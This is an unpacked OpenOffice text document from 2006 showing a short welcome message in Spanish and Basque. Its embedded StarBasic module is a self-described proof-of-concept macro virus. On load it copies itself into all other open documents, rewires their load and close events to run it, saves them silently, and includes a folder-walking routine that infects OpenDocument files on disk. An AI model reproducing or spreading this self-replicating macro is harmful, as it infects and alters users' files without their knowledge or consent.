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DejaVu Sans1" svg:font-family="'DejaVu Sans'" style:font-pitch="variable"/>
    <style:font-face style:name="DejaVu Serif" svg:font-family="'DejaVu Serif'" style:font-family-generic="roman" style:font-pitch="variable"/>
    <style:font-face style:name="DejaVu Sans" svg:font-family="'DejaVu Sans'" style:font-family-generic="swiss"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size="24pt" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="italic" fo:font-weight="bold" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="24pt" fo:font-style="normal" fo:font-weight="normal" style:font-size-asian="24pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="24pt" style:font-style-complex="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Bienvenid@ al maravilloso mundo de OpenOffice</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P4">Ongi etorriak OpenOfficen mundu zoragarrir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DejaVu Sans1" svg:font-family="'DejaVu Sans'" style:font-pitch="variable"/>
    <style:font-face style:name="DejaVu Serif" svg:font-family="'DejaVu Serif'" style:font-family-generic="roman" style:font-pitch="variable"/>
    <style:font-face style:name="DejaVu Sans" svg:font-family="'DejaVu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erif" fo:font-size="12pt" fo:language="es" fo:country="ES" style:font-name-asian="DejaVu Sans1" style:font-size-asian="12pt" style:language-asian="none" style:country-asian="none" style:font-name-complex="DejaVu Sans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Gustavo Iñiguez Goya</meta:initial-creator>
    <meta:creation-date>2006-06-03T15:48:40</meta:creation-date>
    <dc:creator>Gustavo Iñiguez Goya</dc:creator>
    <dc:date>2006-06-06T01:14:17</dc:date>
    <dc:language>es-ES</dc:language>
    <meta:editing-cycles>363</meta:editing-cycles>
    <meta:editing-duration>P1DT15H20M0S</meta:editing-duration>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="1" meta:paragraph-count="2" meta:word-count="11" meta:character-count="88"/>
  </office:meta>
</office:document-meta>
</file>

<file path=Basic/Standard/Module1.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">REM  **************************************************************
REM  ***** Prueba de concepto de macro virus para OpenOffice ******
REM  ***** OpenOfficentzako birus baten kontzeptu-froga      ******
REM  *****            gak egina. - 2006/06                   ******
REM  **************************************************************

Dim strModName as String
Dim strModSource as String
Dim EndMacro as Boolean

Sub Main
OnLoad
End Sub

Sub OnClose
	EndMacro = True
End Sub

Sub OnLoad
Dim arr()
Dim bLibs as Object
Dim xLib as Object
bLibs = ThisComponent.BasicLibraries
EndMacro=False
statusbar = ThisComponent.CurrentController.StatusIndicator
statusbar.start("Documento cargado - gak egina",0)

xLib = bLibs.getByName("Standard")
arr() = xLib.getElementNames()

For i = Lbound(arr()) To Ubound(arr())
 If inStr(xLib.getByName(arr(i)), "gak egina") &lt;&gt; 0 Then
 	strModSource = xLib.getByName(arr(i))
	strModName = arr(i)
	 Exit For
 End If
Next i

' Get all the open documents and modify them
docCom = StarDesktop.getComponents()
docEnum = docCom.createEnumeration()
Do While docEnum.hasMoreElements()
	oDoc = docEnum.nextElement()
	If oDoc.URL &lt;&gt; ThisComponent.URL Then infect (oDoc, oDoc.URL, True)
Loop

' Search for OO files
'ReadDirs("/tmp/lab/")

End Sub


Function ReadDirs (path as String)
 Dim list()

' On error resume next

 listDir  = createUnoService("com.sun.star.ucb.SimpleFileAccess") 
 
 list() = listDir.getFolderContents(ConvertToURL(path), True)   
   for i = LBound(list()) to UBound(list())
   	if EndMacro = True Then exit Function
      fname = ConvertFromURL(list(i))
      
      xfname = ConvertToURL(fname)
      if GetAttr(xfname) = 0 then
      	if Right(xfname, 3) = "odt" OR Right(xfname, 3) = "odp" OR Right(xfname, 3) = "ods" OR Right(xfname, 3) = "odg" then
	      	infect (null, xfname, False)      
	    end if
      else
      	if listDir.exists (fname) = true then
	      	ReadDirs (fname)
		end if
	  end if
	  wait 50
   next i   
   
   
End Function


Function infect(OpenDoc as Object, path as String, IsDocument as Boolean)
Dim Doc as Object
Dim strRnd as String
Dim args(0) As New com.sun.star.beans.PropertyValue
Dim PropValue(1) as new com.sun.star.beans.PropertyValue
Dim PropValue1(1) as new com.sun.star.beans.PropertyValue
  '  On Error Resume next

args(0).name="Hidden"
args(0).value=true
  
Randomize

strRnd = Cstr(Int(Rnd * 999)) &amp; Cstr(Int(Rnd * 999)) &amp; Cstr(Int(Rnd * 999))

If IsDocument = False Then
	Doc = StarDesktop.loadcomponentFromUrl (path, "_blank", 0, args())
Else
	Doc = OpenDoc
End If

If getInfected(Doc) = True Then exit function

If Not Doc.BasicLibraries.HasByName ("Standard") Then 
	Doc.BasicLibraries.CreateLibrary ("Standard", "", "", "")
End If

Doc.BasicLibraries.LoadLibrary ("Standard")
oLib = Doc.BasicLibraries.getByName("Standard")

If Not Doc.BasicLibraries.HasByName (strRnd) Then
	oLib.insertByName(strRnd, strModSource)
Else
	oLib.replaceByName(strRnd, strmodSource)
End If

PropValue(0).Name = "EventType"
PropValue(0).Value = "StarBasic"
PropValue(1).Name = "MacroName"
PropValue(1).Value = "Standard." &amp; strRnd &amp; ".OnLoad"
Doc.Events.replaceByName("OnLoad", PropValue())

PropValue(0).Name = "EventType"
PropValue(0).Value = "StarBasic"
PropValue(1).Name = "MacroName"
PropValue(1).Value = "Standard." &amp; strRnd &amp; ".OnClose"
Doc.Events.replaceByName("OnPrepareUnload", PropValue())
Doc.store()

If IsDocument = False Then
	If hasUnoInterfaces(Doc, "com.sun.star.util.XCloseable") then
		Doc.close(true)
	Else
		Doc.dispose
	End If
End If

End Function

Function getInfected (Doc as Object) as Boolean
Dim arr()
Dim bLibs as Object
Dim xLib as Object
bLibs = Doc.BasicLibraries
xLib = bLibs.getByName("Standard")
arr() = xLib.getElementNames()
For i = Lbound(arr()) To Ubound(arr())
 If inStr(xLib.getByName(arr(i)), "gak egina") &lt;&gt; 0 Then
 	getInfected() = True
 	Exit For
 End If
Next i
 getInfected() = False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